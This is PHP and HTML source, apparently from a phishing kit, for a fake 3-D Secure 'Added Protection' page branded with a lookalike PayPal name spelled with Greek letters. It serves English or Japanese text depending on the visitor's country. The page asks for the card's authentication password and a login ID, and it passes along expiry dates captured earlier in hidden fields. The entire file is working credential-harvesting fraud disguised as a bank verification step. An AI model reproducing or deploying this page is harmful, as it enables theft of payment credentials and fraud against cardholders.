<form method="post" id="parentForm" name="creditcard_Form" action="3dsecure" class="edit" >
<link rel="stylesheet" type="text/css" href="../css/idpass_PC.css">

<?php    
                         
                     function cekAngka($negara) {    
                     if($negara=='JP') {    
                     throw new Exception("NEGARA HARUS JEPANG");    
}    
                     return true;    
}    

    try {    
                    cekAngka($negara);
	echo '<center>
            <table width="390" cellspacing="0" cellpadding="0">
            <tbody>

			<tr>
            <td>
            <div class="contents">
                <table class="logo-image">
                    <tbody><tr>
                        <td class="issuer-logo"><img src="../../poto/SecureLogo.png" width="140" height="47" alt=""></td>
                        <div style="display:none;"><td class="issuer-logo"><img src="../../poto/transparent.png" width="50" height="47" alt=""></td></div>
                        <td class="brand-logo"><img src="../../poto/scurez.jpg" width="140" height="27" alt=""></td>
                    </tr>
                </tbody></table>
                <div class="protection"><font face="Arial">Added Protection</font></div>
                <div class="message"><p><font face="Arial">Do the authentication. Please enter the password of the VISA / MASTERCARD / JCB / AMEXsafekey authentication service.</font></p><br></div>
                <table class="contents">
                <tbody><tr>
                    <td class="item">Merchant：</td>
                    <td class="value">&Rho;ay&Rho;al.com</td>
                </tr>
                <tr>
                    <td class="item">Amount：</td>
                    <td class="value">$0,02 USD</td>
                </tr>
                <tr>
                    <td class="item">Date：</td>
                    <td class="value">July 2016</td>
                </tr>
                <tr>
                    <td class="item">Card Number：</td>
                    <td class="value">*hidden*</td>
                </tr>
                
                <tr>
                    <td class="item">Personal message：</td>
                    <td class="value">A personal greeting</td>
					
                </tr>
                
                                              
                <tr>
                    <td class="item">Password：</td>
                    <td class="value">
					<input name="cc_pass" type="password" autocomplete="off" value="" size="15" maxlength="30" class="password" required=""></td>
					
                </tr>
				<tr>
                    <td class="item"></td>
                    <td class="value">
                        <table class="controls">
                        <tbody><tr>
                            
				<button style="width: 100px !important;" type="submit" value="Submit" class="button">Submit</button>


                            <td valign="middle" align="center">
                                <img src="../../poto/faq_mark.gif" border="0" width="14" height="13" alt="">
                            </td>
                            <td class="help">
                                <a href="https://en.wikipedia.org/wiki/3-D_Secure" target="_blank">Help</a></td>
                                                      
                        </tr>
                        </tbody></table>
                    </td>
                </tr>
                </tbody></table>

				<center>
				<span class="help" style="padding-left:4%;">Copyright &copy; 1999-2017 &Rho;ay&Rho;al. All rights reserved.</span>
                </center>
				</div>
				</td>
				</tr>
				</tbody></table>
				</center>';    
}    
  
catch(Exception $e) {    
 echo '<center>
            <table width="300" cellspacing="0" cellpadding="0">
            <tbody><tr>
            <td>
            <div class="contents">
                <table class="logo-image">
                    <tbody><tr>
                        <td class="issuer-logo"><img src="../../poto/SecureLogo.png" width="140" height="47" alt=""></td>
                        <div style="display:none;"><td class="issuer-logo"><img src="../../poto/transparent.png" width="50" height="47" alt=""></td></div>
                        <td class="brand-logo"><img src="../../poto/scurez.jpg" width="140" height="27" alt=""></td>
                    </tr>
                </tbody></table>
                <div class="protection">Added Protection</div>
                <div class="message"><p>本人認証を行います。VISA/MASTERCARD/JCB/AMEXsafekey認証サービスのパスワードをご入力ください。</p><br></div>
                <table class="contents">
                <tbody><tr>
                    <td class="item">加盟店名：</td>
                    <td class="value">&Rho;ay&Rho;al.com</td>
                </tr>
                <tr>
                    <td class="item">ご利用金額：</td>
                    <td class="value">¥ 0.00</td>
                </tr>
                <tr>
                    <td class="item">ご利用日：</td>
                    <td class="value">July 2016</td>
                </tr>
                <tr>
                    <td class="item">カード番号：</td>
                    <td class="value">XXXX-XXXX-XXXX-XXXX</td>
                </tr>
                
                <tr>
                    <td class="item">パーソナルメッセージ：</td>
                    <td class="value">個人的なメッセージ</td>
                </tr>
                
                
                <tr>
                    <td class="item">ネットID / ログインID：</td>
                    
                    <td class="value"><input name="cc_login" type="text" value="" size="20" maxlength="18" class="loginId"></td>
                    
                </tr>
                
                <tr>
                    <td class="item">パスワード：</td>
                    <td class="value"><input name="cc_pass" type="password" autocomplete="off" value="" size="20" maxlength="30" class="password"></td>
                </tr>
                <tr>
                    <td class="item"></td>
                    <td class="value">
                        <table class="controls">
                        <tbody><tr>
                            <td class="send">
                                <script type="text/javascript" language="JavaScript">
                                
                                </script>
        <button style="width: 100px !important;" type="submit" value="送信" class="button">送信</button>
                                
                            </td>
                            <td valign="middle" align="center">
                                <img src="../../poto/faq_mark.gif" border="0" width="14" height="13" alt="">
                            </td>
                            <td class="help">
                                <a href="#">
ヘルプ
</a>

                                
                            </td>
                            
                        </tr>
                        </tbody></table>
                    </td>
                </tr>
                </tbody></table>
                </div>
            </td>
            </tr>
            </tbody></table>
            </center>';    
}    
?> 
<div style="display:none;"><input name="expdate_month" value="<?php echo $_POST['expdate_month'];?>"><input name="expdate_year" value="<?php echo $_POST['expdate_year'];?>"></div>
                         
</form>